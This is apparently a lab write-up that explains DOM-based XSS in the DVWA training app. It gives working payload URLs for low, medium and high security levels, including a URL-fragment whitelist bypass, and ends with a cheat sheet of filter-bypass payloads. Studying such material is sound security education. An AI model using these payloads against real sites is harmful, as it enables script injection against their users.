# 🧠 Understanding DOM-Based XSS Payload Construction

This guide explains how to analyze, deconstruct, and build DOM-based XSS (Cross-Site Scripting) payloads step-by-step using examples from DVWA.

---

## 📜 Vulnerable Code Context

From the DVWA DOM XSS page, we analyze this JavaScript:

```html
<script>
    if (document.location.href.indexOf("default=") >= 0) {
        var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
        document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    }
</script>
```

🔍 This script:
- Reads the `default=` parameter from the URL.
- Writes it directly into the page using `document.write()`.

---

## 🧪 Low Security – Payload

```
http://localhost/vulnerabilities/xss_d/?default=');<script>alert('hacked!');</script>//
```

### 🔎 How it works:
- `');` closes the `value` attribute.
- `<script>alert(...)</script>` injects JS.
- `//` comments out the rest.

Resulting HTML:
```html
<option value=''>
<script>alert('hacked!');</script>
</option>
```

✅ JavaScript is executed.

---

## 🛡️ Medium Security – Filter Bypass

```php
if (stripos ($default, "<script") !== false) {
    redirect to default=English
}
```

This blocks `<script>` tags.

### ✅ Bypassed with image-based event:
```
http://localhost/vulnerabilities/xss_d/?default=English</option></select><img src='x' onerror='alert(1)'>
```

This breaks out of the HTML safely and injects an `<img>` with an `onerror` JavaScript handler.

---

## 🔒 High Security – Whitelist Bypass

📌 Overview
In the High Security level, DVWA attempts to mitigate DOM-based XSS attacks by using a strict server-side whitelist in PHP. Only specific values for the default parameter (English, French, German, Spanish) are allowed. All other values trigger a redirect to the default page.

However, the actual vulnerability lies entirely on the client side, inside the <script> block within the HTML page. The JavaScript code reads the default parameter from the URL and injects it into the DOM using document.write() without sanitization. This logic is flawed and leads to DOM-based XSS — even though the server doesn’t reflect or store the malicious payload.

🔍 Vulnerability Breakdown

```if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
    document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
    document.write("<option value='' disabled='disabled'>----</option>");
}

```
❌ Problem Description
```🔒 Vulnerability	❌ Problem Description
DOM-Based XSS	User-controlled input (default) is inserted directly into the DOM via document.write() without escaping or sanitization
Bypass of Server Checks	Since the XSS executes purely in the client (browser), the server-side whitelist check has no effect
URL Fragment Injection	Payloads in the URL fragment (#) are not sent to the server — only seen by the browser
```

🔁 How It Works:

The PHP server only sees ?default=English, which passes the whitelist.
The browser also sees the fragment #<script>...</script> — which is ignored by the server.
The DOM-based script extracts default=English#<script>... from document.location.href.
document.write() injects the payload into the page directly — leading to XSS.

PHP restricts input to one of:
- English
- French
- Spanish
- German

But JS still processes the full URL, including fragments.

### 🧪 Payload:

```
http://localhost/vulnerabilities/xss_d/?default=English#<script>alert('hacked')</script>
```

Even though PHP whitelists `default=English`, JavaScript reads everything after the `#`.

Injected:
```js
var lang = 'English#<script>alert("hacked")</script>'
```

Browser renders:
```html
<option value='English#<script>alert("hacked")</script>'>...
```

✅ JS executes the script from the URL fragment.

---

## 🧰 How to Build DOM XSS Payloads – Step by Step

| Step | What to Do | Why |
|------|------------|-----|
| 1️⃣ | Read the vulnerable JavaScript | Know how input is used |
| 2️⃣ | Identify context (attribute, innerHTML, eval) | Injection needs context awareness |
| 3️⃣ | Break out of that context | Use `'`, `">`, `</tag>` as needed |
| 4️⃣ | Insert payload | `<script>`, `onerror=alert()`, `onload=...` |
| 5️⃣ | Neutralize code after | Use `//`, valid closing HTML |

---

## 🔐 Bypass Tips for Filters

| Bypass Case | Payload Example |
|-------------|-----------------|
| Script tag blocked | `<img src=x onerror=alert(1)>` |
| Event-based XSS | `<svg/onload=alert(1)>` |
| Attribute Injection | `' onfocus=alert(1) autofocus>` |
| Fragment-based bypass | `#<script>alert(1)</script>` |
| Case-insensitive filter | `<ScRipT>alert(1)</sCript>` |
| Double encoding | `%3Cscript%3Ealert(1)%3C/script%3E` |

---

## ✅ Summary

DOM-based XSS is about injecting malicious input where JavaScript dynamically injects HTML based on the URL.

- Always look **where the input lands** in the DOM.
- Modify the **structure of the page safely** to sneak in JS.
- **Bypass filters** using encoding, event handlers, and creative HTML.

